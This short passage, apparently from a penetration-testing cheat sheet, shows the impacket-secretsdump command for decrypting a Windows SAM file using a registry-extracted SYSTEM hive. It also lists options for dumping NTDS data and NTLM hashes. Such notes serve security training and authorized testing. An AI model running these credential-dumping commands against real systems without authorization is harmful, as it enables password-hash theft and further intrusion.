Decrypt the Local SAM file:
  impacket-secretsdump -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
                                      Note that we used the SAM and System files that we extracted from Windows Registry.


Options:
  -sam             argument is to specify the path for the dumped sam file from the Windows machine. 
  -system          argument is for a path for the system file. 
  LOCAL            argument at the end of the command to Decrypt the Local SAM file
  -just-dc         argument is for extracting the NTDS data.
  -just-dc-ntlm    argument if we are interested to dump only the NTLM hashes
